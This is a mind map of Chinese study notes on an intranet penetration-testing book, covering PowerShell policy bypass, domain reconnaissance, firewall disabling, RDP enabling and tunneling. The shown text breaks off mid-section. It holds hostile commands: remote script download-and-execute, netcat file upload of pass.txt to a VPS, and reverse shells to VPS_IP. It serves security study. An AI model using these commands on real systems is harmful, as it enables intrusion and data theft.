
<map>
  <node ID="root" TEXT="内网安全攻防-渗透测试指南 读书笔记">
    <node TEXT="一、内网渗透测试基础" ID="39c1735a6a3092018" STYLE="bubble" POSITION="right">
      <node TEXT="Powershell" ID="2051735a6b769d11a" STYLE="fork">
        <node TEXT="查看执行策略 Get-ExecutionPolicy" ID="1b1735a6d14ed11a" STYLE="fork"/>
        <node TEXT="设置执行策略 Set-ExecutionPolicy [options]" ID="1af1735a7c9bf8043" STYLE="fork">
          <node TEXT="Restricted 脚本不能执行【默认设置】" ID="2fc1735a7cf92f146" STYLE="fork"/>
          <node TEXT="RemoteSigned 本地脚本可以运行，远程脚本不能运行" ID="1211735a7d325014d" STYLE="fork"/>
          <node TEXT="AllSigned 受信任的签名脚本才能运行" ID="15f1735a7dbdcd029" STYLE="fork"/>
          <node TEXT="Unrestricted 允许所有脚本运" ID="30c1735a7e1e5505a" STYLE="fork"/>
        </node>
        <node TEXT="运行脚本  .\test.ps1" ID="17e1735a7e9f95176" STYLE="fork">
          <node TEXT="powershell.exe -ExecutionPolicy bypass -File powerup.ps1" ID="1811735a7fee8d00b" STYLE="fork"/>
          <node TEXT="powershell.exe -exec bypass -command &quot;&amp; {Import-Module c:\powerup.ps1;Invoke-AllChecks}&quot;" ID="381735a80b1650ab" STYLE="fork"/>
        </node>
        <node TEXT="一些常用参数" ID="3db1735a83baf509b" STYLE="fork">
          <node TEXT="-ExecutionPolicy bypass 绕过执行安全策略" ID="3161735a83d685143" STYLE="fork"/>
          <node TEXT="-W hidden 隐藏窗口" ID="691735a84512d0c6" STYLE="fork"/>
          <node TEXT="-NonI 不提供交互式的提示" ID="29c1735a84784d01c" STYLE="fork"/>
          <node TEXT="-NoP 不加载当前 用户的配置文件" ID="cf1735a84ba25094" STYLE="fork"/>
          <node TEXT="-noexit 执行后不退出shell" ID="2291735a84f32d132" STYLE="fork"/>
          <node TEXT="-nologo 不显示powershell 版权信息" ID="3c61735a852c0d0cb" STYLE="fork"/>
          <node TEXT="-enc xxxxxx  加载base64编码后的脚本内容" ID="19b1735a85dabd0c6" STYLE="fork"/>
        </node>
        <node TEXT="32位与64位" ID="bd1735a86b78d0c2" STYLE="fork">
          <node TEXT="32位： powershell.exe -Nop -NonI -W hidden -exec bypass" ID="2ee1735a86d07d0e8" STYLE="fork"/>
          <node TEXT="64位：%windir%\syswow64\windowspowershell\v1.0\powershell.exe -Nop -NonI -W hidden -exec bypass" ID="b71735a87291d09d" STYLE="fork"/>
        </node>
      </node>
    </node>
    <node TEXT="二、内网信息收集" ID="3141735a6a63ec0e7" STYLE="bubble" POSITION="right">
      <node TEXT="手动信息收集" ID="2281735a8879940a2" STYLE="fork">
        <node TEXT="查询网络配置信息：ipconfig /all" ID="1191735a88917315d" STYLE="fork"/>
        <node TEXT="查询操作系统及软件信息" ID="541735a89e1a5098" STYLE="fork">
          <node TEXT="查询操作系统版本" ID="21c1735a8a6b5d191" STYLE="fork">
            <node TEXT="systeminfo|findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; [英文版]" ID="2fb1735a88af140b5" STYLE="fork"/>
            <node TEXT="systeminfo|findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; [中文版]" ID="ac1735a8a0fce18" STYLE="fork"/>
          </node>
          <node TEXT="查看系统体系结构" ID="3071735a8a925d086" STYLE="fork">
            <node TEXT="echo %PROCESSOR_ARCHITECTURE%" ID="701735a8ab885093" STYLE="fork"/>
          </node>
          <node TEXT="查看安装 的软件" ID="1b81735a8b11dc0da" STYLE="fork">
            <node TEXT="wmic product get name,version" ID="861735a8b3cfd0fe" STYLE="fork"/>
            <node TEXT="powershell &quot;get-wmiobject -class Win32_product | select-Object -property name,version&quot;" ID="1bc1735a8b697407e" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="查询本机服务信息：wmic service list brief" ID="30a1735a8bf5d5184" STYLE="fork"/>
        <node TEXT="查询进程列表" ID="29d1735a8c7c540cd" STYLE="fork">
          <node TEXT="tasklist" ID="1061735a8cace5173" STYLE="fork"/>
          <node TEXT="wmic process list brief" ID="2891735a8cbc8411e" STYLE="fork"/>
        </node>
        <node TEXT="查询启动信息：wmic startup get command,caption" ID="1c1735a93ceed12a" STYLE="fork"/>
        <node TEXT="查询计划任务：schtasks /query /fo LIST /v" ID="26b1735a9447a5025" STYLE="fork"/>
        <node TEXT="查看主机开机时间：net statistics workstation" ID="551735a94f90d12e" STYLE="fork"/>
        <node TEXT="连接的会话：net session" ID="3f1735a970ccd0ac" STYLE="fork"/>
        <node TEXT="查询补丁" ID="11a1735a98287416d" STYLE="fork">
          <node TEXT="systeminfo" ID="1ce1735a98417d052" STYLE="fork"/>
          <node TEXT="wmic qfe get caption,description,hotfixid,installedon" ID="1041735a984b9d16e" STYLE="fork"/>
        </node>
        <node TEXT="查询共享" ID="2ec1735a9a0cbd122" STYLE="fork">
          <node TEXT="net share" ID="2cb1735a9a1c35131" STYLE="fork"/>
          <node TEXT="wmic share get name,path,status" ID="39c1735a9a273c052" STYLE="fork"/>
        </node>
        <node TEXT="防火墙操作" ID="2c91735a9b6554071" STYLE="fork">
          <node TEXT="查看防火墙状态：netsh firewall show config" ID="2a91735a9b7c76021" STYLE="fork"/>
          <node TEXT="关闭防火墙" ID="911735a9bc89c08e" STYLE="fork">
            <node TEXT="netsh firewall set opmode disable [server 2003]" ID="2571735a9be20c02b" STYLE="fork"/>
            <node TEXT="netsh advfirewall set allprofiles state off [server 2003之后]" ID="dc1735a9c1e5416a" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="查看代理设置" ID="3d1735a9cd21e15d" STYLE="fork">
          <node TEXT="reg query &quot;HKEY_CURRENT_USE6R\Software\Microsoft\windows\currentVersion\Internet Settings&quot;" ID="941735a9cf1b50c8" STYLE="fork"/>
        </node>
        <node TEXT="远程连接服务" ID="3291735a9e60ec048" STYLE="fork">
          <node TEXT="查看远程连接端口" ID="1571735a9e7d2511" STYLE="fork">
            <node TEXT="reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP&quot; /V portNumber [需要将16进制数字进行转换]" ID="1541735a9ea7ad063" STYLE="fork"/>
            <node TEXT="tasklist /svc |findstr TermService 记住pid号 再执行netstat -ano|findstr [pid]" ID="3af1735aa065f8142" STYLE="fork"/>
          </node>
          <node TEXT="开户远程连接端口" ID="19d1735aa2ef3d14d" STYLE="fork">
            <node TEXT="server 2003 &amp; XP" ID="18f1735aa44a5f142" STYLE="fork">
              <node TEXT="wmic path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1 " ID="2ae1735aa308a5178" STYLE="fork"/>
              <node TEXT="REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f" ID="1da1735aa46d8d093" STYLE="fork"/>
            </node>
            <node TEXT="server2008/7/2012" ID="3b01735aa3f2be161" STYLE="fork">
              <node TEXT="wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call  set allowtsconnections 1" ID="2141735aa4a36d02d" STYLE="fork"/>
              <node TEXT="wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =&apos;RDP-Tcp&apos;) call setuserauthenticationrequired 1" ID="eb1735aa4d695142" STYLE="fork"/>
              <node TEXT="reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f" ID="3181735aa52df205" STYLE="fork"/>
              <node TEXT="7和2012只需要前两条即可" ID="1941735aa55122055" STYLE="fork"/>
            </node>
          </node>
        </node>
      </node>
      <node TEXT="自动信息收集" ID="2511735aa57ae1085" STYLE="fork">
        <node TEXT="wmic_info.bat [下载地址：http://www.fuzzysecurity.com/scripts/files/wmic_info.rar]" ID="2ba1735aa58d6a09e" STYLE="fork"/>
        <node TEXT="Empire下的信息收集" ID="33f1735aa92b5e014" STYLE="fork">
          <node TEXT="usemodule situational_awareness/host/winenum" ID="39d1735aa94145054" STYLE="fork"/>
        </node>
      </node>
      <node TEXT="查看当前权限" ID="b31735aaa5d1408f" STYLE="fork">
        <node TEXT="查看当前权限 ：whoami" ID="ec1735aaa71cc006" STYLE="fork"/>
        <node TEXT="获取域SID：whoami /all" ID="1f41735aab5514193" STYLE="fork"/>
        <node TEXT="查询指定用户的详细信息：net user xxx /domain" ID="3b81735aab8ddd0fd" STYLE="fork"/>
      </node>
      <node TEXT="判断是否存在域" ID="2531735aabd2bd01f" STYLE="fork">
        <node TEXT="ipconfig /all [看主DNS 后缀]" ID="2a71735aabf92512e" STYLE="fork"/>
        <node TEXT="systeminfo [看 域 ，如果为workgroup即不在域环境]" ID="17c1735aaccc6d0e6" STYLE="fork"/>
        <node TEXT="net config workstation[看 域 ，如果为workgroup即不在域环境]" ID="291735aade1cd153" STYLE="fork"/>
        <node TEXT="判断主域：net time /domain" ID="3ba1735aae604e18b" STYLE="fork">
          <node TEXT="拒绝访问：存在域，但当前用户不是域用户" ID="1911735aaec11e016" STYLE="fork"/>
          <node TEXT="回显时间：存在域，且当前用户为域用户" ID="2e71735aaf39b5061" STYLE="fork"/>
          <node TEXT="找不到workgroup的域控制器：不存在域" ID="2d01735aaf8b3d07c" STYLE="fork"/>
        </node>
      </node>
      <node TEXT="探测域内存活主机" ID="691735aafc2550f" STYLE="fork">
        <node TEXT="利用NetBIOS快速探测" ID="1121735ab1703d0cb" STYLE="fork">
          <node TEXT="nbtscan 192.168.1.1/20 [下载地址：http://www.unixwiz.net/tools/nbtscan.html#download]" ID="1d1735ab1f8dd0e2" STYLE="fork">
            <node TEXT="sharing :正在运行文件和打印共享服务，不一定有内容共享" ID="2131735ab3cc4d087" STYLE="fork"/>
            <node TEXT="dc: 可能是域控制器" ID="1871735ab42ce50be" STYLE="fork"/>
            <node TEXT="u=user : 有登陆名为User的用户" ID="c01735ab4553c127" STYLE="fork"/>
            <node TEXT="IIS: 可能安装了IIS服务" ID="1d21735ab490f505c" STYLE="fork"/>
            <node TEXT="exchange: 可能安装了exchange" ID="591735ab4c11d14e" STYLE="fork"/>
            <node TEXT="notes : 可能安装了lotus notes 邮件客户端" ID="1d61735ab50035073" STYLE="fork"/>
            <node TEXT="? : 未识别出该机器 的NetBios资源" ID="3591735ab5441514" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="利用ICMP协议探测" ID="2d21735ab591440d4" STYLE="fork">
          <node TEXT="循环ping: for /L %I in (1,1, 254) do @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;" ID="e41735ab5b914183" STYLE="fork"/>
          <node TEXT="VBS脚本" ID="1ec1735aba49dd016" STYLE="fork"/>
        </node>
        <node TEXT="通过ARP扫描探测" ID="1531735ac98f1611a" STYLE="fork">
          <node TEXT="apr-scan工具：arp.exe -t 192.168.1.1/24 [下载地址：https://gitee.com/RichChigga/arp-scan-windows]" ID="24f1735ac9ab7d056" STYLE="fork"/>
          <node TEXT="Empire中的arpscan模块：usemodule situational_awareness/network/arpscan" ID="3b1735aced82e097" STYLE="fork"/>
          <node TEXT="Nishang中的Invoke-ARPScan.ps1脚本" ID="32a1735acf5fd5087" STYLE="fork">
            <node TEXT="powershell.exe -exec bypass -Command &quot;&amp; {Import-Module c:\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.1/24}&quot; &gt;&gt; c:\log.txt" ID="24d1735ad138ed005" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="通过常规TCP/UDP端口扫描" ID="24e1735ad23dbd144" STYLE="fork">
          <node TEXT="scanline工具" ID="3a11735ad2705d0f5" STYLE="fork">
            <node TEXT="scanline -h -t 20,80-89,110,389,445,3389,1099,7001,3306,1433,8080,1521 -u 53,161 -O c:\log.txt -p 192.168.1.1-254 /b" ID="2a71735ad7fad50c9" STYLE="fork"/>
          </node>
        </node>
      </node>
      <node TEXT="扫描域内端口" ID="2c91735adaeac5179" STYLE="fork">
        <node TEXT="利用telnet命令扫描" ID="3751735adb0ead146" STYLE="fork">
          <node TEXT="telnet DC 1433" ID="11a1735adb368d173" STYLE="fork"/>
        </node>
        <node TEXT="s扫描器" ID="1e71735adb7545191" STYLE="fork">
          <node TEXT="s.exe tcp 192.168.1.1 192.168.1.254 445,1433,3389,7001 256 /Banner /save" ID="1161735adb966d08e" STYLE="fork"/>
        </node>
        <node TEXT="Metasploit端口扫描" ID="18b1735adc464406a" STYLE="fork">
          <node TEXT="use auxiliary/scanner/portscan/tcp" ID="ae1735adcdd3e0cd" STYLE="fork"/>
        </node>
        <node TEXT="PowerSploit的Invoke-portscan.ps1脚本" ID="3131735add2afd08d" STYLE="fork">
          <node TEXT="powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&apos;);Invoke-Portscan -Host 192.168.1.1/24 -T4 -ports &apos;445,3389,1433,8080,7001&apos; -oA c:\log.txt&quot;" ID="35e1735add7f84049" STYLE="fork"/>
        </node>
        <node TEXT="Nishang的Invoke-PortScan模块" ID="2041735ae02b3613d" STYLE="fork">
          <node TEXT="Invoke-PortScan -StartAddress 192.168.1.1 -EndAddress 192.168.1.254 -ScanPort   [探测存活 -ResolveHost]" ID="1381735ae05b5c0f7" STYLE="fork"/>
        </node>
      </node>
      <node TEXT="收集域内基础信息" ID="171735ae29fbf06f" STYLE="fork">
        <node TEXT="查询域：net view /domain" ID="2671735b65b8490f5" STYLE="fork"/>
        <node TEXT="查询 域内所有机器：net view /domain:domainName" ID="1a91735b65f567164" STYLE="fork"/>
        <node TEXT="查询域内所有用户组：net group /domain" ID="1841735b6688c90c6" STYLE="fork">
          <node TEXT="域管理员：Domain Admins" ID="3221735b678ac0005" STYLE="fork"/>
          <node TEXT="域内机器 ：Domain Computers" ID="1cd1735b67c08716" STYLE="fork"/>
          <node TEXT="域控制器：Domain Controllers" ID="37c1735b680398044" STYLE="fork"/>
          <node TEXT="域访客： Domain Guest" ID="2b31735b6845f805e" STYLE="fork"/>
          <node TEXT="域用户：Domain Users" ID="611735b6872ae0e5" STYLE="fork"/>
          <node TEXT="企业系统管理员用户：EnterpriseAdmins" ID="2511735b68911615a" STYLE="fork"/>
        </node>
        <node TEXT="查询所有域成员计算机列表：net group &quot;domain computers&quot; /domain" ID="271735b68e370193" STYLE="fork"/>
        <node TEXT="获取域信息信息： nltest /domain_trusts" ID="1501735b69c2200fb" STYLE="fork"/>
      </node>
      <node TEXT="查找域控制器" ID="2671735b6a8686127" STYLE="fork">
        <node TEXT="查看域控制器的机器名：nltest /DCLIST:domainName" ID="24b1735b6ab2af118" STYLE="fork"/>
        <node TEXT="查看域控制器的主机名：nslookup -type=SRV_ldap._tcp" ID="17e1735b6b90a118a" STYLE="fork"/>
        <node TEXT="查看域控制器组：net group &quot;Domain Controllers&quot; /domain" ID="3ae1735b6c1d7f165" STYLE="fork"/>
      </node>
      <node TEXT="获取域内用户和管理员" ID="34e1735b6d6a97163" STYLE="fork">
        <node TEXT="查询所有域用户列表" ID="1bd1735b6d8e9f002" STYLE="fork">
          <node TEXT="向域控制器查询： net user /domain" ID="2941735b6db1770e1" STYLE="fork"/>
          <node TEXT="获取域内用户的详细信息： wmic useraccount get /all" ID="1361735b6e8a7901d" STYLE="fork"/>
          <node TEXT="查看存在的用户：dsquery user" ID="2b61735b6ef857179" STYLE="fork"/>
        </node>
        <node TEXT="查询域管理员用户级" ID="2051735b724d2818" STYLE="fork">
          <node TEXT="查询域管理员用户：net group &quot;Domain admins&quot; /domain" ID="3b1735b72a79802e" STYLE="fork"/>
          <node TEXT="查询管理员用户组：net group &quot;Enterprise Admins&quot; /domain" ID="1a11735b72f927109" STYLE="fork"/>
        </node>
      </node>
      <node TEXT="定位域管理员" ID="4e1735b73613e0b9" STYLE="fork">
        <node TEXT="常用域管理员定位 工具" ID="3001735b7869e9108" STYLE="fork">
          <node TEXT="psloggedon.exe [下载地址：https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon]" ID="2511735b7884a8105" STYLE="fork">
            <node TEXT="可以查看本地登录的用户和通过本地计算机或远程计算机的资源登陆的用户。psloggedon /? 查看帮助文档" ID="3121735b796660003" STYLE="fork"/>
          </node>
          <node TEXT="PVEFindADUser.exe [下载地址：https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn]" ID="3291735b7ffcc705a" STYLE="fork">
            <node TEXT="可用于查找 活动目录用户登陆的位置、枚举域用户、以及查找 在特定计算机上登陆的用户。" ID="cc1735b8098df103" STYLE="fork"/>
          </node>
          <node TEXT="netview.exe[下载地址：https://github.com/mubix/netview ]" ID="2fd1735b8348b1103" STYLE="fork">
            <node TEXT="使用WinAPI枚举系统用户，利用NetSessionEnum寻找登陆会话，利用NetShareEnum寻找共享,利用NetWkstaUserEnum枚举登陆的用户" ID="1a51735b83d4a801e" STYLE="fork"/>
          </node>
          <node TEXT="Nmap的NSE脚本" ID="1091735b87ef9018" STYLE="fork">
            <node TEXT="smb-enum-sessions.nse ：获取远程机器的登陆会话" ID="3ce1735b881d9614e" STYLE="fork"/>
            <node TEXT="smb-enum-domains.nse：对域控制器进行信息收集，获取主机信息、用户、可使用密码策略的用户" ID="2151735b88c5ce0c4" STYLE="fork"/>
            <node TEXT="smb-enum-users.nse：" ID="2161735b89577819" STYLE="fork"/>
            <node TEXT="smb-enum-shares.nse：遍历远程主机的共享目录" ID="fa1735b89c1d9141" STYLE="fork"/>
            <node TEXT="smb-enum-processes.nse：遍历主机的系统进程" ID="20e1735b89e62718c" STYLE="fork"/>
            <node TEXT="smb-os-discovery.nse：收集目标主机的操作系统、计算机名、域名、域林名称、NetBios机器名、NetBIOS域名、工作组、系统时间等" ID="ad1735b8a4770046" STYLE="fork"/>
          </node>
          <node TEXT="PowerView脚本" ID="431735b8b609f1" STYLE="fork">
            <node TEXT="Invoke-StealthUserHunter" ID="1071735b8b77e00bd" STYLE="fork">
              <node TEXT="只需要一次查询，就可以获取域里面的所有用户。PowerView默认使用Invoke-StealthUserHunter，如果找不到需要的信息，就使用Invoke-UserHunter" ID="2841735b8c9c18089" STYLE="fork"/>
            </node>
            <node TEXT="Invoke-UserHunter" ID="3081735b8c54ef0df" STYLE="fork">
              <node TEXT="找到域内特定的用户群，接收用户名、用户列表和域组查询 ，接收一个主机列表或查询 可用的主机域名" ID="3c11735b8e3718008" STYLE="fork"/>
              <node TEXT="powershell.exe -exec bypass -Command &quot;&amp; {Import-module C:\powerview.ps1;Invoke-UserHunter}&quot;" ID="18b1735b8f325713" STYLE="fork"/>
            </node>
          </node>
          <node TEXT="Empire的user_hunter模块" ID="36a1735b90a4a1145" STYLE="fork">
            <node TEXT="usemodule situational_awareness/network/powerview/user_hunter  可用于查找域管理员登陆的机器 " ID="2e21735b90cedf03e" STYLE="fork"/>
          </node>
        </node>
      </node>
      <node TEXT="查找域管理进程" ID="2481735b921d070b3" STYLE="fork">
        <node TEXT="本机检查 " ID="3431735b929387142" STYLE="fork">
          <node TEXT="net group &quot;Domain Admins&quot; /domain" ID="33c1735b93006015" STYLE="fork"/>
          <node TEXT="tasklist /svc" ID="2821735b933568078" STYLE="fork"/>
        </node>
        <node TEXT="查找域控制器的域用户会话" ID="1911735b937eaf07c" STYLE="fork">
          <node TEXT="查找域控制器列表：net group &quot;Domain Controllers&quot; /domain" ID="2e71735b93a53f092" STYLE="fork"/>
          <node TEXT="查找域管理员列表：net group &quot;Domain Admins&quot; /domain" ID="fb1735b945ff8001" STYLE="fork"/>
          <node TEXT="查找所有活动域的会话列表：netsess -h [下载地址：http://www.joeware.net/freetools/tools/netsess/index.htm]" ID="1ee1735b94b331185" STYLE="fork"/>
          <node TEXT="交叉引用域管理员列表与活动会话列表" ID="2b91735b9dc330089" STYLE="fork">
            <node TEXT="下列脚本可以快速使用netsess.exe的windows命令行：for /F %i (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;null &gt; sessions.txt &amp;&amp; FOR /F %a in (admins.txt) do @type sessions.txt | @findstr /I %a " ID="3181735b9f1b28199" STYLE="fork"/>
            <node TEXT="Get Domain Admin(GDA)批处理脚本[下载地址：https://github.com/nullbind/Other-Projects/tree/master/GDA]" ID="1c51735ba7dcb80ca" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="查询远程系统中运行的任务" ID="2f01735bc115f7157" STYLE="fork">
          <node TEXT="for /F %i in (ips.txt) do @echo [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;Nul &gt; output.txt &amp;&amp; for /F %n in (names.txt) do @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %n was found runnning a process on %i &amp;&amp; pause" ID="3501735bc195c005c" STYLE="fork"/>
        </node>
        <node TEXT="扫描远程系统的NetBIOS信息" ID="2711735bc3a3400aa" STYLE="fork">
          <node TEXT="for /F %i in (ips.txt) do @echo [+] checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt; nbsessions.txt &amp;&amp; for /F %n in (admins.txt) do @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i" ID="22a1735bc3e3f6088" STYLE="fork"/>
          <node TEXT="将域机器列表写入ips.txt ,收集到的域管理员列表写入admins.txt" ID="2721735bd117490de" STYLE="fork"/>
          <node TEXT="for /F %i in (ips.txt) do @echo [+] checking %i &amp;&amp; nbtscan -f %i 2&gt;NUL &gt; nbsessions.txt &amp;&amp; for /F %n in (admins.txt) do @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i" ID="33d1735bd1f181078" STYLE="fork"/>
        </node>
      </node>
      <node TEXT="域管理员模拟方法" ID="b1735bd329c7165" STYLE="fork">
        <node TEXT="如果已经拥有一个meterpreter会话，可以使用Incognito来模拟 域管理员或者添加一个域管理员，通过尝试遍历系统中所有可用的授权令牌来添加新的管理员。" ID="2e1735bd5e690035" STYLE="fork"/>
      </node>
      <node TEXT="利用Powershell收集域信息" ID="3001735bd73d680e1" STYLE="fork">
        <node TEXT="powersploit\recon\powerview.ps1" ID="3c31735bd77428034" STYLE="fork">
          <node TEXT="Get-NetDomain: 获取当前用户所在域名称" ID="9a1735bdef9170f" STYLE="fork"/>
          <node TEXT="Get-NetUser:获取所有用户的详细信息" ID="1de1735bdf4dd7169" STYLE="fork"/>
          <node TEXT="Get-NetDomainController：获取所有域控制器的信息" ID="3111735bdf6fbf05a" STYLE="fork"/>
          <node TEXT="Get-NetComputer：获取域内所有机器的详细信息" ID="3a81735bdf89bf0ab" STYLE="fork"/>
          <node TEXT="Get-NetOU：获取域内的OU信息" ID="2db1735bdfa06716c" STYLE="fork"/>
          <node TEXT="Get-NetGroup：获取所有域内组和组成员的信息" ID="27a1735bdfcc38036" STYLE="fork"/>
          <node TEXT="Get-NetFileServer：根据SPN获取域内使用的文件服务器信息" ID="1721735bdfe7a717" STYLE="fork"/>
          <node TEXT="Get-NetShare：获取域内所有的网络共享信息" ID="2251735bdfff4f171" STYLE="fork"/>
          <node TEXT="Get-NetSession：获取指定服务器的会话" ID="51735be0139f12f" STYLE="fork"/>
          <node TEXT="Get-Netprocess：获取远程主机的进程" ID="3a21735be02477134" STYLE="fork"/>
          <node TEXT="Get-UserEvent：获取指定用户的日志" ID="2821735be04b230ca" STYLE="fork"/>
          <node TEXT="Get-ADObject：获取活动目录对象" ID="1f1735be0696f104" STYLE="fork"/>
          <node TEXT="Get-DomainPolicy：获取域默认策略或域控制器策略" ID="2ec1735be07a9f12c" STYLE="fork"/>
          <node TEXT="Invoke-UserHuter：获取域用户登陆的计算机信息及该用户是否有本地管理员权限 " ID="3a1735be096370c9" STYLE="fork"/>
          <node TEXT="Invoke-ProcessHunter：通过查询 域内所有机器 进程找到特定用户" ID="1371735be0bbe703c" STYLE="fork"/>
          <node TEXT="Invoke-userEventHunter：根据用户日志查询 某域用户登陆过哪些域机器" ID="1271735be0dc87118" STYLE="fork"/>
        </node>
      </node>
      <node TEXT="域分析工具BloodHound" ID="a51735be5b3c701" STYLE="fork">
        <node TEXT="配置环境[下载地址：https://github.com/BloodHoundAD/BloodHound/]" ID="661735be6a94710f" STYLE="fork"/>
        <node TEXT="采集数据 " ID="15d1735be707d807c" STYLE="fork">
          <node TEXT="bloodhound分析时需要调用活动目录的三条信息" ID="2c61735be750d803f" STYLE="fork">
            <node TEXT="哪些 用户登陆了哪些机器 " ID="f41735be79e500e1" STYLE="fork"/>
            <node TEXT="哪些用户拥有管理员权限 " ID="3841735be7b8b7105" STYLE="fork"/>
            <node TEXT="哪些用户和组属于哪些组" ID="1721735be7cff0158" STYLE="fork"/>
            <node TEXT="SharpHound.exe -c all" ID="33e1735beaf210001" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="导入数据" ID="21d1735becd8a015f" STYLE="fork">
          <node TEXT="上传SharpHound.exe生成的zip文件" ID="22b1735becf25702c" STYLE="fork"/>
        </node>
        <node TEXT="查询数据" ID="4a1735bedf5990a7" STYLE="fork">
          <node TEXT="Find all Domain Admins  选择需要查询的域名，查找 所有域管理员" ID="1a61735bee0308052" STYLE="fork"/>
          <node TEXT="Find Shortest Paths to domain Admins 查找到达域管理员的最短路径" ID="3741735bee8178033" STYLE="fork"/>
        </node>
      </node>
    </node>
    <node TEXT="三、隐藏通信隧道技术" ID="2c11735a6a70aa175" STYLE="bubble" POSITION="right">
      <node TEXT="判断内网联通性" ID="18e1735c131cd0136" STYLE="fork">
        <node TEXT="ICMP协议：ping" ID="1c91735c13330704c" STYLE="fork"/>
        <node TEXT="TCP协议：nc\ncat" ID="551735c13568f031" STYLE="fork"/>
        <node TEXT="HTTP协议：curl\wget" ID="1111735c13822f0fa" STYLE="fork"/>
        <node TEXT="DNS协议：nslookup\dig" ID="2221735c13a2470b6" STYLE="fork">
          <node TEXT="nslookup www.baidu.com vps_ip" ID="3d51735c13edc7033" STYLE="fork"/>
          <node TEXT="dig @vps_ip www.baidu.com A" ID="1221735c141cc2082" STYLE="fork"/>
        </node>
      </node>
      <node TEXT="网络层隧道技术" ID="61735c35d44b0fd" STYLE="fork">
        <node TEXT="IPv6隧道" ID="2aa1735c35ecb509" STYLE="fork">
          <node TEXT="工具：socat、6tunnel、nt6tunnel等" ID="1e11735c3607a4162" STYLE="fork"/>
        </node>
        <node TEXT="ICMP隧道" ID="3e21735c3decb20fc" STYLE="fork">
          <node TEXT="icmpsh [下载地址：https://github.com/inquisb/icmpsh.git]" ID="1d51735c3dff53137" STYLE="fork">
            <node TEXT="安装python-impacket类库：apt-get install python-impacket  关闭系统的ICMP应答：sysctl -w net.ipv4.icmp_echo_ignore_all=1" ID="31c1735c3e812b096" STYLE="fork"/>
          </node>
          <node TEXT="PingTunnel[下载地址：http://freshmeat.sourceforge.net/projects/ptunnel/]" ID="f917361d1a72c0d" STYLE="fork">
            <node TEXT="目标机器[192.168.1.4\1.1.1.10]运行：ptunnel -x shuteer  已控制机器[192.168.1.1]执行：ptunnel -p 192.168.1.4 -lp 1080 -da 1.1.1.11 -dp 3389 -x shuteer   " ID="23317361d6b48401a" STYLE="fork"/>
            <node TEXT="-x 指定ICMP连接的密码；-lp 指定要监听的本地TCP端口；-da 指定要转发的目标机器IP地址；-dp 指定要转发的目标机器TCP端口；-p 指定ICMP隧道另一端IP地址" ID="23d17361da9aaa0bc" STYLE="fork"/>
          </node>
        </node>
      </node>
      <node TEXT="传输层隧道技术" ID="29f17361dc67030d6" STYLE="fork">
        <node TEXT="lcx端口转发" ID="3dc17361dc9db30d5" STYLE="fork">
          <node TEXT="内网端口转发" ID="16517361dcc92c166" STYLE="fork">
            <node TEXT="将目标机器3389端口转发到公网VPS4444端口：lcx.exe -slave VPS_IP 4444 127.0.0.1 3389  在VPS上执行：lcx.exe -listen 4444 5555  本地mstsc连接VPS_IP:5555端口即目标机器 的3389" ID="15a17361de0f4408b" STYLE="fork"/>
          </node>
          <node TEXT="本地端口映射" ID="12017361dfdf4d133" STYLE="fork">
            <node TEXT="部分端口[如3389]无法通过防火墙：lcx.exe -tran 53 127.0.0.1 3389" ID="a117361dffd740ce" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="netcat" ID="2db17361e33cfc074" STYLE="fork">
          <node TEXT="文件传输" ID="18617361e355b313c" STYLE="fork">
            <node TEXT="VPS上运行：nc -lv 12345 &gt; 1.txt  目标机器上运行：nc -vn VPS_IP 333 &lt; pass.txt  -q 1" ID="8217361e42d3a12c" STYLE="fork"/>
          </node>
          <node TEXT="正向Shell" ID="20b17361e75dba067" STYLE="fork">
            <node TEXT="目标机器上执行 [Linux]nc -lvvp 4444 -e /bin/sh   [Windows] nc -lvvp 4444 -e c:\windows\system32\cmd.exe   本地执行：nc 目标机器外网IP 4444" ID="6717361e776b313d" STYLE="fork"/>
          </node>
          <node TEXT="反向Shell" ID="32d17361e9d539089" STYLE="fork">
            <node TEXT="VPS上执行：nc -lvvp 9999 目标主机上执行：[Linux] nc VPS_ip 9999 -e /bin/sh [Windows] nc VPS_IP 9999 -e c:\windows\system32\cmd.exe " ID="c017361e9f282006" STYLE="fork"/>
          </node>
          <node TEXT="目标主机没有NC时获取反向Shell" ID="d117361eb9192106" STYLE="fork">
            <node TEXT="Python" ID="2b117361ebe3a914d" STYLE="fork">
